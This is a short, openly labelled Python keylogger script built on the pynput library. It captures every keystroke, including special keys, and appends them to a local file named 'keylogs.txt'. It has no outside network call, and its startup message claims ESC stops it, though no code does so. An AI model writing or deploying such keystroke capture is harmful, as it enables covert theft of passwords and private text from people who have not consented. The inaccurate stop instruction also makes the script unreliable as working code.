from pynput import keyboard

log_file = "keylogs.txt"  # File to save keystrokes

def on_press(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char'):  # Printable character
                f.write(key.char)
            elif key == keyboard.Key.space:  # Convert space key to actual space
                f.write(" ")
            elif key == keyboard.Key.enter:  # Convert Enter key to new line
                f.write("\n")
            else:
                f.write(f"[{key.name}]")  # For special keys (e.g., shift, ctrl)
    except Exception as e:
        print(f"Error: {e}")

def main():
    print("Keylogger started... Press ESC to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
